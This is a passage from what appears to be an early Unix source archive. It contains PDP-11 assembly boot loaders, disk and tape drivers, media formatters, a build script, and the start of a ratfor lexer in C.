	bmi	1b
	rts	pc

rrec:
	bit	$2,*$mts
	bne	rrec
	tstb	*$mtc
	bge	rrec
	mov	$-512.,*$mtbrc
	mov	mtma,*$mtcma
	mov	$60003,*$mtc
1:
	tstb	*$mtc
	bge	1b
	tst	*$mtc
	bge	1f
	mov	$-1,*$mtbrc
	mov	$60013,*$mtc
	br	rrec
1:
	add	$512.,mtma
	inc	mtapa
	rts	pc

rew:
	mov	$60017,*$mtc
	clr	mtapa
	rts	pc
.endif

.if .mt.-1
tcdt = 177350
tccm = 177342
taper:
	mov	$tcdt,r0
	mov	$tccm,r1
for:
	mov	$3,(r1)			/ rbn for
1:
	tstb	(r1)
	bge	1b
	tst	(r1)
	blt	rev
	cmp	tapa,(r0)
	beq	rd
	bgt	for

rev:
	mov	$4003,(r1)		/ rbn bac
1:
	tstb	(r1)
	bge	1b
	tst	(r1)
	blt	for
	mov	(r0),r2
	add	$5,r2
	cmp	tapa,r2
	blt	rev
	br	for

rd:
	clr	-(r0)				/ bus addr
	mov	wc,-(r0)			/ wc
	mov	$5,-(r0)			/ read
1:
	tstb	(r1)
	bge	1b
	tst	(r1)
	blt	taper
	rts	pc

rew:
	mov	$4003,tccm
	rts	pc
.endif

tvec:
	br	putc
	br	getc
	br	mesg

tks = 177560
tkb = 177562
getc:
	mov	$tks,r0
	inc	(r0)
1:
	tstb	(r0)
	bge	1b
	mov	tkb,r0
	bic	$!177,r0
	cmp	r0,$'A
	blo	1f
	cmp	r0,$'Z
	bhi	1f
	add	$40,r0
1:
	cmp	r0,$'\r
	bne	putc
	mov	$'\n,r0

tps = 177564
tpb = 177566
putc:
	tstb	tps
	bge	putc
	cmp	r0,$'\n
	bne	1f
	mov	$'\r,r0
	jsr	pc,(r5)
	mov	$'\n+200,r0
	jsr	pc,(r5)
	clr	r0
	jsr	pc,(r5)
	mov	$'\n,r0
	rts	pc
1:
	mov	r0,tpb
	rts	pc

mesg:
	movb	*(sp),r0
	beq	1f
	jsr	pc,(r5)
	inc	(sp)
	br	mesg
1:
	add	$2,(sp)
	bic	$1,(sp)
	rts	pc

end:
tapa:	.=.+2
mtapa:	.=.+2
mtma:	.=.+2
wc:	.=.+2
name:	.=.+32.
-- /usr/source/mdec/mcopy.s mode=0100664 uid=3 gid=3 atime=174929176 mtime=173058208 --
/ copy mag tape to disk
/ load with proper tape and disk drivers

	jsr	pc,rew
2:
	jsr	pc,4(r5)
		<disk offset\n\0>
		.even
	jsr	pc,numb
	mov	r0,dska
	jsr	pc,4(r5)
		<tape offset\n\0>
		.even
	jsr	pc,numb
	mov	r0,tapa
	jsr	pc,4(r5)
		<count\n\0>
		.even
	jsr	pc,numb
	mov	r0,r2
1:
	jsr	pc,tread
	jsr	pc,wblk
	inc	tapa
	inc	dska
	dec	r2
	bne	1b
	jsr	pc,rew
	rts	pc

numb:
	clr	r1
1:
	jsr	pc,2(r5)
	cmp	r0,$'\n
	beq	1f
	sub	$'0,r0
	cmp	r0,$9
	bhi	2f
	mul	$10.,r1
	add	r0,r1
	br	1b
1:
	mov	r1,r0
	rts	pc
2:
	jsr	pc,4(r5)
		<illegal digit\n\0>
		.even
	tst	(sp)+
	rts	pc

ba:	buf
wc:	-256.
.bss
buf:	.=.+512.
dska:	.=.+2
tapa:	.=.+2
.text
-- /usr/source/mdec/reset.s mode=0100664 uid=3 gid=3 atime=174929155 mtime=173058208 --
/ reset
	5
	rts	pc
-- /usr/source/mdec/rhp.s mode=0100664 uid=3 gid=3 atime=174929134 mtime=173058209 --
/ hpread

rblk:

iocom = 71
-- /usr/source/mdec/rk.s mode=0100664 uid=3 gid=3 atime=174929170 mtime=173058209 --
/ rk05 disk driver

rkda = 177412
	mov	dska,r1
	clr	r0
	div	$12.,r0
	ash	$4.,r0
	bis	r1,r0
	mov	$rkda,r1
	mov	r0,(r1)
	mov	ba,-(r1)
	mov	wc,-(r1)
	mov	$iocom,-(r1)
1:
	tstb	(r1)
	bpl	1b
	rts	pc
-- /usr/source/mdec/rkf.s mode=0100664 uid=3 gid=3 atime=174929153 mtime=173058209 --
/ format RK03/05 disk packs

rkda = 177412

	jsr	pc,4(r5)
		<ready drive 0 and type y\n\0>; .even
	jsr	pc,2(r5)
	mov	r0,-(sp)
	mov	$'\n,r0
	jsr	pc,(r5)
	cmp	(sp)+,$'y
	beq	1f
	rts	pc
1:
	mov	$203.*2,r4
	clr	r3
1:
	mov	$rkda+2,r0
	mov	r3,-(r0)
	mov	$buf,-(r0)
	mov	$-12.*256.,-(r0)
	mov	$6003,-(r0)
2:
	tstb	(r0)
	bge	2b
	tst	(r0)
	blt	1f
	add	$20,r3
	dec	r4
	bne	1b
	rts	pc
1:
	jsr	pc,4(r5)
		<rkf: error\n\0>; .even
	rts	pc

buf:	.=.+2
-- /usr/source/mdec/rp.s mode=0100664 uid=3 gid=3 atime=174929173 mtime=173058209 --
/ rp03 disk driver

rpda = 176724
	mov	dska,r1
	clr	r0
	div	$10.,r0
	mov	r1,-(sp)
	mov	r0,r1
	clr	r0
	div	$20.,r0
	bisb	r1,1(sp)
	mov	$rpda,r1
	mov	(sp)+,(r1)
	mov	r0,-(r1)
	mov	ba,-(r1)
	mov	wc,-(r1)
	mov	$iocom,-(r1)
1:
	tstb	(r1)
	bpl	1b
	rts	pc
-- /usr/source/mdec/rrk.s mode=0100664 uid=3 gid=3 atime=174929126 mtime=173058209 --
/ read rk

rblk:
iocom = 5
-- /usr/source/mdec/rrp.s mode=0100664 uid=3 gid=3 atime=174929130 mtime=173058209 --
/ read rp

rblk:
iocom = 5
-- /usr/source/mdec/run mode=0100664 uid=3 gid=3 atime=174929179 mtime=174929120 --
as fsboot.s tty.s rrk.s rk.s
strip a.out
ls -l a.out
cp a.out /usr/mdec/rkuboot

as fsboot.s tty.s rrp.s rp.s
strip a.out
ls -l a.out
cp a.out /usr/mdec/rpuboot

as fsboot.s tty.s rhp.s hp.s
strip a.out
ls -l a.out
cp a.out /usr/mdec/hpuboot

as tpboot.s tty.s tc.s
strip a.out
ls -l a.out
cp a.out /usr/mdec/tboot

as tpboot.s tty.s tm.s
strip a.out
ls -l a.out
cp a.out /usr/mdec/mboot

as tpboot.s tty.s ht.s
strip a.out
ls -l a.out
cp a.out /usr/mdec/hboot

as tcf.s
strip a.out
cp a.out /usr/mdec/tcf

as rkf.s
strip a.out
cp a.out /usr/mdec/rkf

as reset.s
strip a.out
cp a.out /usr/mdec/reset

as dldr.s
strip a.out
cp a.out /usr/mdec/dldr

as mcopy.s tm.s wrk.s rk.s
strip a.out
cp a.out /usr/mdec/tmrk

as mcopy.s tm.s wrp.s rp.s
strip a.out
cp a.out /usr/mdec/tmrp

as mcopy.s tm.s whp.s hp.s
strip a.out
cp a.out /usr/mdec/tmhp

as mcopy.s ht.s wrk.s rk.s
strip a.out
cp a.out /usr/mdec/htrk

as mcopy.s ht.s wrp.s rp.s
strip a.out
cp a.out /usr/mdec/htrp

as mcopy.s ht.s whp.s hp.s
strip a.out
cp a.out /usr/mdec/hthp

rm a.out
-- /usr/source/mdec/tboot.s mode=0100664 uid=3 gid=3 atime=174929000 mtime=173058209 --
/ tape boot program to load and transfer
/ to a 'tp' entry

/ entry is made by jsr pc,*$0
/ so return can be rts pc
/ jsr pc,(r5) is putc
/ jsr pc,2(r5) is getc
/ jsr pc,4(r5) is mesg

core = 24.
.mt. = 0
.. = [core*2048.]-512.
start:
	mov	$..,sp
	mov	$name,r4
	mov	sp,r1
	cmp	pc,r1
	bhis	2f
	clr	r0
	cmp	(r0),$407
	bne	1f
	mov	$20,r0
1:
	mov	(r0)+,(r1)+
	cmp	r1,$end
	blo	1b
	jmp	(sp)

2:
	jsr	pc,rew
	mov	$tvec,r5
	mov	$'=,r0
	jsr	pc,(r5)
2:
	mov	r4,r1
1:
	jsr	pc,2(r5)
	cmp	r0,$'\n
	beq	1f
	cmp	r0,$'@
	beq	2b
	movb	r0,(r1)+
	cmp	r0,$'#
	bne	1b
	sub	$2,r1
	cmp	r1,r4
	blo	2b
	br	1b
1:
	clrb	(r1)
	cmp	r1,r4
	blos	start
	mov	$1,tapa
	mov	$-6144.,wc
	jsr	pc,taper
	clr	r1
1:
	mov	r1,r2
	mov	r4,r0
2:
	cmpb	(r0)+,(r1)
	bne	2f
	tstb	(r1)+
	bne	2b
	br	1f
2:
	mov	r2,r1
	add	$64.,r1
	cmp	r1,$12288.
	blo	1b
	jsr	pc,rew
	br	start
1:
	mov	44.(r2),tapa
	mov	38.(r2),r0
	inc	r0
	clc
	ror	r0
	neg	r0
	mov	r0,wc
	clr	r0
1:
	clr	(r0)+
	cmp	r0,sp
	blo	1b
	jsr	pc,taper
	jsr	pc,rew
	clr	r0
	cmp	(r0),$407		/ unix a.out?
	bne	2f
1:
	mov	20(r0),(r0)+
	cmp	r0,sp
	blo	1b
2:
	jsr	pc,*$0
	br	start

.if .mt.
mts = 172520
mtc = 172522
mtbrc = 172524
mtcma = 172526

taper:
	clr	mtma
	cmp	mtapa,tapa
	beq	1f
	bhi	2f
	jsr	pc,rrec
	br	taper
2:
	jsr	pc,rew
	br	taper
1:
	mov	wc,r1
1:
	jsr	pc,rrec
	add	$256.,r1
	bmi	1b
	rts	pc

rrec:
	bit	$2,*$mts
	bne	rrec
	tstb	*$mtc
	bge	rrec
	mov	$-512.,*$mtbrc
	mov	mtma,*$mtcma
	mov	$60003,*$mtc
1:
	tstb	*$mtc
	bge	1b
	tst	*$mtc
	bge	1f
	mov	$-1,*$mtbrc
	mov	$60013,*$mtc
	br	rrec
1:
	add	$512.,mtma
	inc	mtapa
	rts	pc

rew:
	mov	$60017,*$mtc
	clr	mtapa
	rts	pc
.endif

.if .mt.-1
tcdt = 177350
tccm = 177342
taper:
	mov	$tcdt,r0
	mov	$tccm,r1
for:
	mov	$3,(r1)			/ rbn for
1:
	tstb	(r1)
	bge	1b
	tst	(r1)
	blt	rev
	cmp	tapa,(r0)
	beq	rd
	bgt	for

rev:
	mov	$4003,(r1)		/ rbn bac
1:
	tstb	(r1)
	bge	1b
	tst	(r1)
	blt	for
	mov	(r0),r2
	add	$5,r2
	cmp	tapa,r2
	blt	rev
	br	for

rd:
	clr	-(r0)				/ bus addr
	mov	wc,-(r0)			/ wc
	mov	$5,-(r0)			/ read
1:
	tstb	(r1)
	bge	1b
	tst	(r1)
	blt	taper
	rts	pc

rew:
	mov	$4003,tccm
	rts	pc
.endif

tvec:
	br	putc
	br	getc
	br	mesg

tks = 177560
tkb = 177562
getc:
	mov	$tks,r0
	inc	(r0)
1:
	tstb	(r0)
	bge	1b
	mov	tkb,r0
	bic	$!177,r0
	cmp	r0,$'A
	blo	1f
	cmp	r0,$'Z
	bhi	1f
	add	$40,r0
1:
	cmp	r0,$'\r
	bne	putc
	mov	$'\n,r0

tps = 177564
tpb = 177566
putc:
	tstb	tps
	bge	putc
	cmp	r0,$'\n
	bne	1f
	mov	$'\r,r0
	jsr	pc,(r5)
	mov	$'\n+200,r0
	jsr	pc,(r5)
	clr	r0
	jsr	pc,(r5)
	mov	$'\n,r0
	rts	pc
1:
	mov	r0,tpb
	rts	pc

mesg:
	movb	*(sp),r0
	beq	1f
	jsr	pc,(r5)
	inc	(sp)
	br	mesg
1:
	add	$2,(sp)
	bic	$1,(sp)
	rts	pc

end:
tapa:	.=.+2
mtapa:	.=.+2
mtma:	.=.+2
wc:	.=.+2
name:	.=.+32.
-- /usr/source/mdec/tc.s mode=0100664 uid=3 gid=3 atime=174929138 mtime=173058209 --
tcdt = 177350
tccm = 177342
tread:
	mov	$tcdt,r0
	mov	$tccm,r1
for:
	mov	$3,(r1)			/ rbn for
1:
	tstb	(r1)
	bge	1b
	tst	(r1)
	blt	rev
	cmp	tapa,(r0)
	beq	rd
	bgt	for

rev:
	mov	$4003,(r1)		/ rbn bac
1:
	tstb	(r1)
	bge	1b
	tst	(r1)
	blt	for
	mov	(r0),r2
	add	$5,r2
	cmp	tapa,r2
	blt	rev
	br	for

rd:
	mov	ba,-(r0)			/ bus addr
	mov	wc,-(r0)			/ wc
	mov	$5,-(r0)			/ read
1:
	tstb	(r1)
	bge	1b
	tst	(r1)
	blt	tread
	rts	pc

rew:
	mov	$4003,tccm
	rts	pc
-- /usr/source/mdec/tcf.s mode=0100664 uid=3 gid=3 atime=174929149 mtime=173058209 --
/ unix DEC-tape time/mtrack track formatter

nword = 256.
nblock = 578.
endz = 7200.

ps = 177776
tcst = 177340
tccm = 177342
tcwc = 177344
tcba = 177346
tcdt = 177350

	mov	r5,savr5
	mov	sp,savsp

	jsr	pc,4(r5)
		<ready drive 0 and type y\n\0>; .even
	jsr	pc,2(r5)
	mov	r0,-(sp)
	mov	$'\n,r0
	jsr	pc,(r5)
	cmp	(sp)+,$'y
	beq	1f
	rts	pc
1:
	clr	r0
	mov	$cobtab,r1
1:
	jsr	pc,bcomobv
	mov	r2,(r1)+
	inc	r0
	cmp	r0,$512.
	bne	1b

	mov	$buffer,r0
1:
	mov	$-1,(r0)+
	cmp	r0,$buffer+nword+nword
	blo	1b

	mov	savr5,r5
	jsr	pc,2(r5)

	mov	$340,ps
	mov	$tcdt,r5
	mov	$13,tccm
	jsr	pc,flag

/ 8Kch for end zone

	mov	$endz,r4
1:
	jsr	r0,mtrack; 101101
	dec	r4
	bne	1b

/ foreward guard

	mov	$199.,r4
1:
	jsr	r0,mtrack; 10101
	dec	r4
	bne	1b

/ blocks

	mov	$nblock,r3
1:
	jsr	r0,mtrack; 10101
	jsr	r0,mtrack; 10110
	jsr	r0,mtrack; 11010
	jsr	r0,mtrack; 01000
	jsr	r0,mtrack; 01000
	jsr	r0,mtrack; 01000
	jsr	r0,mtrack; 01000
	mov	$nword-4,r4
2:
	jsr	r0,mtrack; 111000
	dec	r4
	bne	2b
	jsr	r0,mtrack; 111011
	jsr	r0,mtrack; 111011
	jsr	r0,mtrack; 111011
	jsr	r0,mtrack; 111011
	jsr	r0,mtrack; 101001
	jsr	r0,mtrack; 100101
	jsr	r0,mtrack; 10101
	dec	r3
	bne	1b

/ rear guard

	mov	$199.,r4
1:
	jsr	r0,mtrack; 10101
	dec	r4
	bne	1b

/ rear end zone

	mov	$endz,r4
1:
	jsr	r0,mtrack; 10010
	dec	r4
	bne	1b
	clr	tccm

/ end of mtrack pass
/ go back 12 blocks

	mov	$12.,r0
	mov	$4002,tccm
1:
	incb	tccm
	jsr	pc,flag
	dec	r0
	bne	1b

/ put comobv(nblock-1) in everything
/ up to end zone

	mov	$nblock-1,r0
	mov	r0,bn
	jsr	pc,comobv
	mov	$17,tccm
	jsr	pc,flag
1:
	movb	r1,tcst
	mov	r0,(r5)
	jsr	pc,flag1
		br 1b

/ reverse pass put in
/ foreward and reverse
/ block numbers

	mov	$4017,tccm
	jsr	pc,flag
1:
	mov	$nword+3.,r4
2:
	clrb	tcst
	clr	(r5)
	jsr	pc,flag
	dec	r4
	bne	2b

	clrb	tcst
	clr	(r5)
	mov	bn,r0
	jsr	pc,comobv
	jsr	pc,flag
	movb	r1,tcst
	mov	r0,(r5)
	jsr	pc,flag
	dec	bn
	blt	check
	clrb	tcst
	clr	(r5)
	jsr	pc,flag
	clrb	tcst
	clr	(r5)
	jsr	pc,flag
	clrb	tcst
	mov	bn,(r5)
	jsr	pc,flag
	clrb	tcst
	clr	(r5)
	jsr	pc,flag
	clrb	tcst
	clr	(r5)
	jsr	pc,flag
	br	1b

/ foreward pass
/ confirm block numbers
/ write all 1's in data

check:
	clrb	tcst
	clr	(r5)
	jsr	pc,flag1
		br check
	clr	r4
1:
	mov	$3,tccm
	jsr	pc,flag
	cmp	(r5),r4
	bne	error1
	mov	$-nword,tcwc
	mov	$buffer,tcba
	mov	$15,tccm
	jsr	pc,flag
	inc	r4
	cmp	r4,$nblock
	bne	1b
	mov	$3,tccm
	jsr	pc,flag1
		br error2

/ reverse pass
/ confirm block numbers
/ read data and compare
/ to all 1's

1:
	mov	$4003,tccm
	jsr	pc,flag
	dec	r4
	cmp	r4,(r5)
	bne	error3
	mov	$-nword,tcwc
	mov	$buffer,tcba
	mov	$4005,tccm
	jsr	pc,compare
	jsr	pc,flag
	tst	r4
	bne	1b
	mov	$4003,tccm
	jsr	pc,flag1
		br error4
	jsr	pc,compare
	mov	savr5,r5
	mov	savsp,sp
	rts	pc

error1:
	mov	$1,r0
	br	1f
error2:
	mov	$1,r0
	br	1f
error3:
	mov	$3,r0
	br	1f
error4:
	mov	$4,r0
	br	1f
error5:
	mov	$5,r0
	br	1f
error6:
	mov	$6,r0
	br	1f
error7:
	mov	$7,r0
1:
	mov	$1,tccm
	mov	savr5,r5
	mov	savsp,sp
	jsr	pc,4(r5)
		<tcf: error\n\0>; .even
	rts	pc

compare:
	mov	r0,-(sp)
	mov	$buffer,r0
1:
	cmp	(r0)+,$-1
	bne	error5
	cmp	r0,$buffer+nword+nword
	blo	1b
	mov	(sp)+,r0
	rts	pc

mtrack:
	mov	(r0)+,(r5)
	jsr	pc,flag
	rts	r0

flag:
	bit	$100200,tccm
	beq	flag
	blt	error6
	rts	pc

flag1:
	bit	$100200,tccm
	beq	flag1
	bge	1f
	tst	tcst
	bge	error7
	add	$2,(sp)
1:
	rts	pc

comobv:
	mov	r0,r4
	bic	$!777,r0
	asl	r0
	mov	cobtab(r0),r0
	swab	r0
	clr	r1
	ror	r0
	rol	r1
	asl	r0
	asl	r0
	rol	r1
	swab	r4
	bic	$177401,r4
	bis	cobtab(r4),r0
	rts	pc

bcomobv:
	mov	r0,r2
	bic	$!70,r2
	mov	r0,r3
	mov	$6.,r4
1:
	asr	r3
	dec	r4
	bne	1b
	bic	$!7,r3
	bis	r3,r2
	mov	r0,r3
	mov	$6.,r4
1:
	asl	r3
	dec	r4
	bne	1b
	bic	$!700,r3
	bis	r3,r2
	com	r2
	bic	$!777,r2
	rts	pc

bn:	.=.+2
savr5:	.=.+2
savsp:	.=.+2
cobtab:	.=.+1024.
buffer:	.=.+nword+nword
-- /usr/source/mdec/tm.s mode=0100664 uid=3 gid=3 atime=174929167 mtime=174929017 --
mts = 172520
mtc = 172522
mtbrc = 172524
mtcma = 172526

tread:
1:
	mov	ba,mtma
	cmp	mtapa,tapa
	beq	1f
	bhi	2f
	jsr	pc,rrec
	br	1b
2:
	jsr	pc,rew
	br	1b
1:
	mov	wc,r1
1:
	jsr	pc,rrec
	add	$256.,r1
	bmi	1b
	rts	pc

rrec:
	mov	$mts,r0
	bit	$2,(r0)+		/ rewind status
	bne	rrec
	tstb	(r0)+		/ cu ready
	bpl	rrec
	inc 	r0
	mov	$-512.,(r0)+	/ byte count
	mov	mtma,(r0)	/ bus address
	mov	$mtc,r0
	mov	$60003,(r0)		/ read 800bpi
1:
	tstb	(r0)
	bpl	1b
	tst	(r0)+
	bpl	1f
	mov	$-1,(r0)
	mov	$60013,-(r0)		/ backspace
	br	rrec
1:
	add	$512.,mtma
	inc	mtapa
	rts	pc

rew:
	mov	$60017,*$mtc
	clr	mtapa
	rts	pc

mtapa:	0
mtma:	0
-- /usr/source/mdec/tpboot.s mode=0100664 uid=3 gid=3 atime=174929145 mtime=173058209 --
/ tape boot program to load and transfer
/ to a 'tp' entry

/ entry is made by jsr pc,*$0
/ so return can be rts pc
/ jsr pc,(r5) is putc
/ jsr pc,2(r5) is getc
/ jsr pc,4(r5) is mesg

core = 24.
.. = [core*2048.]-512.
start:
	mov	$..,sp
	mov	sp,r1
	cmp	pc,r1
	bhis	2f
	clr	r0
	cmp	(r0),$407
	bne	1f
	mov	$20,r0
1:
	mov	(r0)+,(r1)+
	cmp	r1,$core*2048.
	blo	1b
	jmp	(sp)

2:
	mov	$trvect,r5
	mov	$name,r4
	jsr	pc,rew
	mov	$'=,r0
	jsr	pc,(r5)
2:
	mov	r4,r1
1:
	jsr	pc,getc
	cmp	r0,$'\n
	beq	1f
	cmp	r0,$'@
	beq	2b
	movb	r0,(r1)+
	cmp	r0,$'#
	bne	1b
	sub	$2,r1
	cmp	r1,r4
	blo	2b
	br	1b
1:
	clrb	(r1)
	cmp	r1,r4
	blos	start
	mov	$1,tapa
	mov	$-6144.,wc
	jsr	pc,tread
	clr	r1
1:
	mov	r1,r2
	mov	r4,r0
2:
	cmpb	(r0)+,(r1)
	bne	2f
	tstb	(r1)+
	bne	2b
	br	1f
2:
	mov	r2,r1
	add	$64.,r1
	cmp	r1,$12288.
	blo	1b
	jsr	pc,rew
	br	start
1:
	mov	44.(r2),tapa
	mov	38.(r2),r0
	inc	r0
	clc
	ror	r0
	neg	r0
	mov	r0,wc
	clr	r0
1:
	clr	(r0)+
	cmp	r0,sp
	blo	1b
	jsr	pc,tread
	jsr	pc,rew
	br	callout

tapa:	0
wc:	0
ba:	0
name	= ..-32.
-- /usr/source/mdec/tty.s mode=0100664 uid=3 gid=3 atime=174929145 mtime=173058209 --
/ read and echo character from tty.
/ perform normal cr/lf uc/lc mapping.
tks = 177560
tkb = 177562
getc:
	tstb	*$tks
	bge	getc
	mov	tkb,r0
	bic	$!177,r0
	cmp	r0,$'A
	blo	1f
	cmp	r0,$'Z
	bhi	1f
	add	$'a-'A,r0
1:
	cmp	r0,$'\r
	bne	putc
	mov	$'\n,r0

/ put a character on the tty.
/ also performs delay.
tps = 177564
tpb = 177566
putc:
	cmp	r0,$'\n
	bne	1f
	mov	$'\r,r0
	jsr	pc,(r5)
	mov	$'\n,r0
1:
	tstb	tps
	bpl	1b
	mov	r0,tpb
	rts	pc

/ write a string to tty
/ jsr pc, mesg; <string\0>; .even
mesg:
	movb	*(sp),r0
	beq	1f
	jsr	pc,(r5)
	inc	(sp)
	br	mesg
1:
	add	$2,(sp)
	bic	$1,(sp)
	rts	pc

callout:
	clr	r0
	cmp	(r0),$407
	bne	2f
1:
	mov	20(r0),(r0)+
	cmp	r0,sp
	blo	1b
2:
	mov	$start,-(sp)
	clr	pc

trvect:
	br	putc
	br	getc
	br	mesg
-- /usr/source/mdec/uboot.s mode=0100664 uid=3 gid=3 atime=174929003 mtime=173058209 --
/ disk boot program to load and transfer
/ to a unix entry

/ entry is made by jsr pc,*$0
/ so return can be rts pc

core = 24.
.. = [core*2048.]-512.
start:
	mov	$..,sp
	mov	sp,r1
	cmp	pc,r1
	bhis	2f
	reset
	clr	r0
	cmp	(r0),$407
	bne	1f
	mov	$20,r0
1:
	mov	(r0)+,(r1)+
	cmp	r1,$end
	blo	1b
	jmp	(sp)

2:
	mov	$inod,r0
1:
	clr	(r0)+
	cmp	r0,sp
	blo	1b
	jsr	pc,getc
	cmp	r0,$'k
	bne	3f
	mov	$rkblk,r0
	br	1f
3:
	cmp	r0,$'p
	bne	2b
	mov	$rpblk,r0
1:
	mov	r0,rxblk
	mov	$'\n,r0
	jsr	pc,putc
	mov	$names,r1

1:
	mov	r1,r2
2:
	jsr	pc,getc
	cmp	r0,$'\n
	beq	1f
	cmp	r0,$'/
	beq	3f
	movb	r0,(r2)+
	br	2b
3:
	cmp	r1,r2
	beq	2b
	add	$14.,r1
	br	1b
1:
	mov	$names,r1
	mov	$1,r0
1:
	clr	bno
	jsr	pc,iget
	tst	(r1)
	beq	1f
2:
	jsr	pc,rmblk
		br start
	mov	$buf,r2
3:
	mov	r1,r3
	mov	r2,r4
	add	$16.,r2
	tst	(r4)+
	beq	5f
4:
	cmpb	(r3)+,(r4)+
	bne	5f
	cmp	r4,r2
	blo	4b
	mov	-16.(r2),r0
	add	$14.,r1
	br	1b
5:
	cmp	r2,$buf+512.
	blo	3b
	br	2b
1:
	clr	r1
1:
	jsr	pc,rmblk
		br 1f
	mov	$buf,r2
2:
	mov	(r2)+,(r1)+
	cmp	r2,$buf+512.
	blo	2b
	br	1b
1:
	clr	r0
	cmp	(r0),$407
	bne	2f
1:
	mov	20(r0),(r0)+
	cmp	r0,sp
	blo	1b
2:
	jsr	pc,*$0
	br	start

iget:
	add	$31.,r0
	mov	r0,r5
	ash	$-4.,r0
	jsr	pc,rblk
	bic	$!17,r5
	ash	$5.,r5
	add	$buf,r5
	mov	$inod,r4
1:
	mov	(r5)+,(r4)+
	cmp	r4,$addr+16.
	blo	1b
	rts	pc

rmblk:
	add	$2,(sp)
	mov	bno,r0
	inc	bno
	bit	$LRG,mode
	bne	1f
	asl	r0
	mov	addr(r0),r0
	bne	rblk
2:
	sub	$2,(sp)
	rts	pc
1:
	clr	-(sp)
	movb	r0,(sp)
	clrb	r0
	swab	r0
	asl	r0
	mov	addr(r0),r0
	beq	2b
	jsr	pc,rblk
	mov	(sp)+,r0
	asl	r0
	mov	buf(r0),r0
	beq	2b

rblk:
	mov	r1,-(sp)
	mov	r0,r1
	clr	r0
	jmp	*rxblk

rpda = 176724
rpblk:
	div	$10.,r0
	mov	r1,-(sp)
	mov	r0,r1
	clr	r0
	div	$20.,r0
	bisb	r1,1(sp)
	mov	$rpda,r1
	mov	(sp)+,(r1)
	br	1f

rkda = 177412
rkblk:
	div	$12.,r0
	ash	$4.,r0
	bis	r1,r0
	mov	$rkda+2,r1

1:
	mov	r0,-(r1)
	mov	$buf,-(r1)
	mov	$-256.,-(r1)
	mov	$5,-(r1)
1:
	tstb	(r1)
	bge	1b
	mov	(sp)+,r1
	rts	pc

tks = 177560
tkb = 177562
getc:
	mov	$tks,r0
	inc	(r0)
1:
	tstb	(r0)
	bge	1b
	mov	tkb,r0
	bic	$!177,r0
	cmp	r0,$'A
	blo	1f
	cmp	r0,$'Z
	bhi	1f
	add	$40,r0
1:
	cmp	r0,$'\r
	bne	putc
	mov	$'\n,r0

tps = 177564
tpb = 177566
putc:
	tstb	tps
	bge	putc
	cmp	r0,$'\n
	bne	1f
	mov	$'\r,r0
	jsr	pc,putc
	mov	$'\n+200,r0
	jsr	pc,putc
	clr	r0
	jsr	pc,putc
	mov	$'\n,r0
	rts	pc
1:
	mov	r0,tpb
	rts	pc

end:
inod = ..-1024.
mode = inod
addr = inod+8.
buf = inod+32.
bno = buf+514.
rxblk = bno+2
names = rxblk+2
LRG = 10000
reset = 5
-- /usr/source/mdec/whp.s mode=0100664 uid=3 gid=3 atime=174929177 mtime=173058209 --
/ hpwrite

wblk:

iocom = 61
-- /usr/source/mdec/wrk.s mode=0100664 uid=3 gid=3 atime=174929170 mtime=173058209 --
/ write rk

wblk:
iocom = 3
-- /usr/source/mdec/wrp.s mode=0100664 uid=3 gid=3 atime=174929173 mtime=173058210 --
/ write rp

wblk:
iocom = 3
-- /usr/source/rat mode=0140775 uid=3 gid=3 atime=174930098 mtime=174922365 --
-- /usr/source/rat/lex.c mode=0110664 uid=3 gid=3 atime=174922338 mtime=169260227 --
# include "r.h"

char *keyword []{
	"do", "DO",	/* have to be first */
	"if", "IF",
	"else", "ELSE",
	"for", "FOR",
	"repeat", "REPEAT",
	"until", "UNTIL",
	"while", "WHILE",
	"break", "BREAK",
	"next", "NEXT",
	"define", "DEFINE",
	"include", "INCLUDE",
	0};

#include "y.tab.c"

int keytran[]{
	0, 0,
	XIF, XIF,
	XELSE, XELSE,
	XFOR, XFOR,
	REPEAT, REPEAT,
	UNTIL, UNTIL,
	XWHILE, XWHILE,
	XBREAK, XBREAK,
	NEXT, NEXT,
	XDEFINE, XDEFINE,
	XINCLUDE, XINCLUDE,
	0};

int	svargc;
char	**svargv;
int	infile	0;
int	fd	0;
int	ninclude	0;
int	filestack[10];
int	linect[10];

main(argc,argv) int argc; char **argv; {
	contfld = errorflag = 0;
	if(argc>1 && argv[1][0]=='-'){
		if(argv[1][1]=='6')
			contfld=6;
		argc--;
		argv++;
	}
	svargc = argc;
	svargv = argv;
	filestack[0] = infile = fd = ninclude = linect[0] = 0;
	if(--svargc>0)
		if( (fd = filestack[0] = copen(svargv[++infile],'r')) < 0 ) {
			error("can't open %s", svargv[infile]);
			cexit(1);
		}
	yyparse();
	cexit(errorflag);
}

int	peek	-1;
int	nextchar	'\n';

getc(){
	nextchar = (peek<0) ? gchar(): peek;
	peek = -1;
	return(nextchar);
}

int	gcp	0;
char	gcbuf[300];
int	apos	-1;

gchar(){
	extern int linect[], nnames;
	extern char *names[], *nameptr[];
	int c,i,atype,t;
	if( c=gcbuf[gcp++] )
		return(c);
   loop:
	for(gcp=0; (c=gcbuf[gcp]=cgetc(fd))!='\0' ; gcp++ ){
		if( gcbuf[0]== '%' ){
			while(putchar(cgetc(fd))!='\n');
			gcp = -1;
			++linect[ninclude];
			continue;
		}
		if( (atype=alphanum(c)) && apos < 0 ){
			apos = gcp;
			continue;
		}
		if( !atype )
			if( apos >= 0 ){
				gcbuf[gcp] = '\0';
				if( nnames>0 && (t=lookup(&gcbuf[apos],names))>=0){
					for(i=0;gcbuf[apos++]=nameptr[t][i];i++);
					gcp = apos-1;
				}
				apos = -1;
				gcbuf[gcp] = c;
			}
		if( c < ' ' && (c!='\n' && c!='\t') )	/* strip crap */
			c = gcbuf[gcp] = ' ';
		if( c=='#' ){
			gcbuf[gcp] = '\n';
			while( (c=cgetc(fd))!='\n' && c!='\0');
		}
		if( c=='"' || c=='\'' ){
			while( (gcbuf[++gcp]=t=cgetc(fd)) != c )
				if( t=='\n' ) {
					error("unbalanced quote");
					gcbuf[gcp] = c;
					gcbuf[++gcp] = c = '\n';
					goto newline;
				}
			continue;
		}
	newline:
		if( c=='\n' ){
			gcbuf[gcp+1] = '\0';
			gcp = 1;
			++linect[ninclude];
			return(gcbuf[0]);
		}
	}
	if(ninclude){
		cclose(filestack[ninclude--]);
		fd = filestack[ninclude];
		goto loop;
	}
	cclose(filestack[ninclude]);
	if(--svargc>0){
		if( (fd = filestack[ninclude] = copen(svargv[++infile],'r')) < 0) {
			error("can't open %s", svargv[infile]);
			cexit(1);
		}
		linect[0] = 0;
		goto loop;
	}
	return(0);
}

inclstat(){
	int i,c;
	char fname[100];
	while( (c=getc())==' ' || c=='\t' );
